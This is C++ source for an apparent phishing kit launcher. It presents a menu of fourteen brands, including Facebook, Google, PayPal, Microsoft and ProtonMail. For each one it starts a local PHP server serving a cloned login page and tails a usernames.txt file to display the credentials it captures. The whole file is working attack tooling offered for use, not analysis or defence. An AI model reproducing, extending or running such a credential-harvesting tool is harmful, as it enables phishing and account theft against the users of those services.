#include<iostream>
#include<string.h>
#include<stdlib.h>
#include<cstdlib>
#include<string>
#include<stdio.h>
#include "color.h"
#include<sstream>
using namespace std;
const string decore = "\033[31m[\033[33m+\033[31m]\033[0m";
class System{
private:
	int i;
public:
	int function_banner(){
		int func = system("cat banner.txt");
		if(func==0){
			return 0;
		}else{
			if(func!=0){
				return 1;
			}
		}
		return 2;
	}
	int creator(){
		string lista[]={" CREATOR: DigitalNinja00 ", "VERSION: 1.0"};
		cout<<GREEN<<lista[0]<<YELLOW<<lista[1]<<endl;
		return 0;
	}
};
class Generate{
private:
	int log;
public:
	int facebook_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/facebook/ > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/facebook/usernames.txt");
		return 0;
	}
	int instagram_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/instagram/ > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/instagram/usernames.txt");
		return 0;
	}
	int linkedin_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/linkedin > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/linkedin/usernames.txt");
		return 0;
	}
	int mediafire_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/mediafire > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/mediafire/usernames.txt");
		return 0;
	}
	int discord_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/discord > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/discord/usernames.txt");
		return 0;
	}
	int google_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/google > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/google/usernames.txt");
		return 0;
	}
	int twitch_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/twitch > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/twitch/usernames.txt");
		return 0;
	}
	int wordpress_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/wordpress > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/wordpress/usernames.txt");
		return 0;
	}
	int steam_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/steam > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/steam/usernames.txt");
		return 0;
	}
	int playstation_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/playstation > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/playstation/usernames.txt");
		return 0;
	}
	int netflix_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/netflix > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/netflix/usernames.txt");
		return 0;
	}
	int protonmail_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/protonmail > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/protonmail/usernames.txt");
		return 0;
	}
	int microsoft_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/microsoft > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/microsoft/usernames.txt");
		return 0;
	}
	int paypal_gen(){
		cout<<decore<<"Enabling local server"<<endl;
		system("sleep 2");
		system("nohup php -S localhost:8080 -t sites/paypal > /dev/null 2>&1 &");
		cout<<RED<<"http://localhost:8080"<<endl;
		cout<<GREEN<<"imprimiendo resultados capturados: "<<GREEN<<endl;
		system("tail -f sites/paypal/usernames.txt");
		return 0;
	}
};
int main(){
	cout<<RED<<endl;
	System var;
	System* var1 = &var;
	int control = var1->function_banner();
	if(control == 0){

	}else{
		if(control==1){
			return 0;
		}
	}
	System creador;
	System* cr = &creador;
	int second_control = cr->creator();
	if(second_control==0){

	}else{
		if(second_control==1){
			return 0;
		}
	}
	string pages[] = {"Facebook", "Instagram", "Linkedin", "MediaFire", "discord", "Google",
    "Twitch", "Wordpress", "Steam", "ps4", "Netflix", "ProtonMail", "Microsoft", "PayPal", "Salir"};
	for(int x=0; x<15;x++){
		string bar1 = "[";
		string bar2 = "]";
		stringstream controlador;
		controlador<<RED<<bar1<<YELLOW<<x<<RED<<bar2<<" "<<GREEN<<pages[x];
		cout<<controlador.str().c_str()<<endl;
	}
	int controluser;
	cout<<RED<<"option"<<BLUE<<">>> "<<YELLOW;cin>>controluser;
	if(controluser==0){
		//FUNCION FACEBOOK
		Generate ll;
		Generate* tt = &ll;
		tt->facebook_gen();
	}else{
		if(controluser==1){
			//FUNCIONES INSTAGRAM
			Generate del;
			Generate* fucker = &del;
			fucker->instagram_gen();
		}else{
			if(controluser==2){
				//FUNCIONES LINKEDIN
				Generate suck;
				Generate* sucker = &suck;
				sucker->linkedin_gen();
			}else{
				if(controluser==3){
					//FUNCIONES MEDIAFIRE
					Generate media;
					Generate* video = &media;
					video->mediafire_gen();
				}else{
					if(controluser==4){
						//FUNCIONES DISCORD
						Generate kk;
						Generate* uwu;
						uwu->discord_gen();
					}else{
						if(controluser==5){
							//GOOGLE
							Generate owo;
							Generate* xd = &owo;
							xd->google_gen();
						}else{
							if(controluser==6){
								//FUNCIONES TWITCH
								Generate your;
								Generate* food = &your;
								food->twitch_gen();
							}else{
								if(controluser==7){
									//FUNCIONES WORDPRESS
									Generate user;
									Generate* pwd = &user;
									pwd->wordpress_gen();
								}else{
									if(controluser==8){
										//FUNCIONES STEAM
										Generate doit;
										Generate* icant = &doit;
										icant->steam_gen();
									}else{
										if(controluser==9){
											//FUNCIONES PS4
											Generate xbox;
											Generate* xbobo = &xbox;
											xbobo->playstation_gen();
										}else{
											if(controluser==10){
												//FUNCIONES NETFLIX
												Generate loader;
												Generate* redaol=&loader;
												redaol->netflix_gen();
											}else{
												if(controluser==11){
													//FUNCIONES PROTONMAIL
													Generate xxd;
													Generate * dxx = &xxd;
													dxx->protonmail_gen();
												}else{
													if(controluser==12){
														Generate macro;
														Generate* excel = & macro;
														excel->microsoft_gen();
													}else{
														if(controluser==13){
															Generate pay;
															Generate* pal = &pay;
															pal->paypal_gen();
														}else{
															if(controluser==14){
																return 0;
															}else{
																cout<<"BAD OPTION!"<<endl;
																return 0;
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
	int varra;
	cout<<RED<<"quiere cerrar el servidor php? 0 si 1 no >>> "<<YELLOW;cin>>varra;
	if(varra==0){
		system("pkill php");
	}
	if(varra==1){
		cout<<"Perfecto ;)"<<endl;
		return 0;
	}
	return 0;
}